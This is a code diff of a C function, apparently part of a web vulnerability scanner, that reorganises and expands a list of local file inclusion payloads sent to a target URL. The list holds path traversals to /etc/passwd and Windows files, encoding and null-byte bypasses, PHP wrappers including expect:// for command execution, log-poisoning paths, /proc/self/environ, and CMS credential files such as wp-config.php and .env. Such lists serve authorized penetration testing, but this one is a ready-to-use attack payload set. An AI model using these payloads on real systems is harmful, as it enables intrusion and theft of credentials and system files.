@@ -89,54 +89,104 @@ void testar_lfi(const char *url){
     char response[4096] = {0};
     
     const char *listlfi[] = {
-        "/?page=../../../../etc/passwd",                            // Unix/Linux passwd file
-        "/?file=../../../../etc/passwd",                           // Alternative file inclusion
-        "/?view=../../../../etc/passwd",                           // Alternative parameter
-        "/?document=../../../../etc/passwd",                       // Alternative parameter name
-        "/?include=../../../../etc/passwd",                        // Alternative parameter name
-        "/?content=../../../../etc/passwd",                        // Reading sensitive file
-        "/?path=../../../../etc/passwd",                           // Common path parameter
-        "/index.php?page=../../../../etc/passwd",                  // Classic PHP LFI
-        "/?module=../../../../etc/passwd",                         // Module-specific inclusion
-        "/?load=../../../../etc/passwd",                           // Alternative for loading files
+    // Basic Local File Inclusions
+    "/?page=../../../../etc/passwd",                            // Unix/Linux passwd file
+    "/?file=../../../../etc/passwd",                           // Alternative file inclusion
+    "/?view=../../../../etc/passwd",                           // Alternative parameter
+    "/?document=../../../../etc/passwd",                       // Alternative parameter name
+    "/?include=../../../../etc/passwd",                        // Alternative parameter name
+    "/?content=../../../../etc/passwd",                        // Reading sensitive file
+    "/?path=../../../../etc/passwd",                           // Common path parameter
+    "/index.php?page=../../../../etc/passwd",                  // Classic PHP LFI
+    "/?module=../../../../etc/passwd",                         // Module-specific inclusion
+    "/?load=../../../../etc/passwd",                           // Alternative for loading files
 
-        "/?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd",                 // URL-encoded slashes
-        "/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // Double URL-encoded
-        "/?page=..%252F..%252F..%252F..%252Fetc%252Fpasswd",       // Double-encoded slashes
+    // Encoded Traversals
+    "/?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd",                 // URL-encoded slashes
+    "/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // Double URL-encoded
+    "/?page=..%252F..%252F..%252F..%252Fetc%252Fpasswd",       // Double-encoded slashes
 
-        "/?page=../../../../etc/passwd%00",                        // Null byte injection
-        "/?file=../../../../etc/passwd%00",                        // Null byte with file param
+    // Null Byte Injection
+    "/?page=../../../../etc/passwd%00",                        // Null byte injection
+    "/?file=../../../../etc/passwd%00",                        // Null byte with file param
 
-        "/?page=../../../../boot.ini",                             // Windows Boot configuration
-        "/?file=../../../../windows/win.ini",                      // Windows INI file
-        "/?path=../../../../windows/system32/drivers/etc/hosts",   // Windows hosts file
+    // Windows Files
+    "/?page=../../../../boot.ini",                             // Windows Boot configuration
+    "/?file=../../../../windows/win.ini",                      // Windows INI file
+    "/?path=../../../../windows/system32/drivers/etc/hosts",   // Windows hosts file
 
-        "/?page=../../../../var/log/apache2/access.log",           // Unix log poisoning
-        "/?file=../../../../var/log/apache2/error.log",            // Unix error logs
-        "/?page=../../../../var/log/nginx/access.log",             // Nginx logs
-        "/?file=../../../../var/log/nginx/error.log",              // Nginx error logs
+    // Log Files
+    "/?page=../../../../var/log/apache2/access.log",           // Unix log poisoning
+    "/?file=../../../../var/log/apache2/error.log",            // Unix error logs
+    "/?page=../../../../var/log/nginx/access.log",             // Nginx logs
+    "/?file=../../../../var/log/nginx/error.log",              // Nginx error logs
 
-        "/?page=php://filter/convert.base64-encode/resource=index", // Base64 encoding
-        "/?page=php://input",                                      // Include POST input
-        "/?page=php://fd/0",                                       // File descriptor
+    // PHP Wrappers
+    "/?page=php://filter/convert.base64-encode/resource=index", // Base64 encoding
+    "/?page=php://input",                                      // Include POST input
+    "/?page=php://fd/0",                                       // File descriptor
 
-        "/?page=../../../../boot.ini::$DATA",                      // ADS access on NTFS
+    // NTFS ADS
+    "/?page=../../../../boot.ini::$DATA",                      // ADS access on NTFS
 
-        "/?page=/proc/self/environ",                               // Access environment variables
-        "/?file=/proc/self/cmdline",                               // Command line arguments
-        "/?path=/proc/version",                                    // Kernel version
+    // System Information
+    "/?page=/proc/self/environ",                               // Access environment variables
+    "/?file=/proc/self/cmdline",                               // Command line arguments
+    "/?path=/proc/version",                                    // Kernel version
 
-        "/?page=../../../../wp-config.php",                        // WordPress config file
-        "/?file=../../../../configuration.php",                    // Joomla config file
-        "/?path=../../../../config.php",                           // General config file
-        "/?include=../../../../app/etc/local.xml",                 // Magento config file
-        "/?module=../../../../.env",                               // Laravel environment file
+    // CMS Configuration Files
+    "/?page=../../../../wp-config.php",                        // WordPress config file
+    "/?file=../../../../configuration.php",                    // Joomla config file
+    "/?path=../../../../config.php",                           // General config file
+    "/?include=../../../../app/etc/local.xml",                 // Magento config file
+    "/?module=../../../../.env",                               // Laravel environment file
 
-        "/?page=../index.php",                                     // Single level up
-        "/?page=../../index.php",                                  // Two levels up
-        "/?page=../../../index.php",                               // Three levels up
-        "/?page=../../../../index.php"                             // Four levels up
-    };
+    // Directory Traversals
+    "/?page=../index.php",                                     // Single level up
+    "/?page=../../index.php",                                  // Two levels up
+    "/?page=../../../index.php",                               // Three levels up
+    "/?page=../../../../index.php",                            // Four levels up
+
+    // Advanced LFI and Bypasses
+    "/?file=....//....//....//etc/passwd",                     // Double slashes
+    "/?file=....\\\\....\\\\....\\\\etc\\\\passwd",            // Double backslashes
+    "/?file=..%2f..%2f..%2f..%2fetc%2fpasswd",                // Mixed encoding
+    "/?file=..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts", // Windows encoding
+    "/?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",         // UTF-8 encoded traversal
+    "/?file=..%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd",           // UTF-8 encoded dots
+    "/?file=../../../../etc/passwd%2500",                     // Null byte with encoding
+    "/?file=../../../../etc/passwd%00.php",                   // PHP extension spoofing
+
+    // More PHP Wrappers
+    "/?file=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd", // Base64 encode bypass
+    "/?file=php://filter/convert.base64-encode/resource=index.php", // Encode PHP file
+    "/?file=php://input",                                   // Read POST input
+    "/?file=php://fd/0",                                    // STDIN as file descriptor
+    "/?file=php://temp",                                    // PHP temp file stream
+    "/?file=php://memory",                                  // PHP memory stream
+    "/?file=expect://ls",                                   // Execute commands (if allowed)
+    "/?file=zip://../../../../var/log/access.log%23file",   // Zip wrapper to read files
+    "/?file=phar://../../../../test.phar",                  // Phar wrapper
+
+    // Log Poisoning
+    "/?file=/var/log/apache2/access.log",                  // Poison Apache logs
+    "/?file=/var/log/nginx/access.log",                    // Poison Nginx logs
+    "/?file=/var/log/httpd/error.log",                     // Poison HTTPD logs
+
+    // Container and Virtual Environments
+    "/?file=/proc/self/mounts",                            // Active mounts in the system
+    "/?file=/proc/self/cgroup",                            // Cgroup details (Docker, Kubernetes)
+    "/?file=/proc/self/fd/0",                              // Open file descriptor 0
+    "/?file=/proc/self/fd/1",                              // Open file descriptor 1
+    "/?file=/proc/self/exe",                               // Current executable file
+
+    // CMS-specific Configs
+    "/?file=../../../../wp-content/debug.log",              // WordPress debug logs
+    "/?file=../../../../wp-config.php~",                    // WordPress backup file
+    "/?file=../../../../storage/logs/laravel.log",          // Laravel logs
+    "/?file=../../../../configuration.php-dist",            // Joomla sample config
+};
+
 
     int total_listlfi = sizeof(listlfi) / sizeof(listlfi[0]);
     
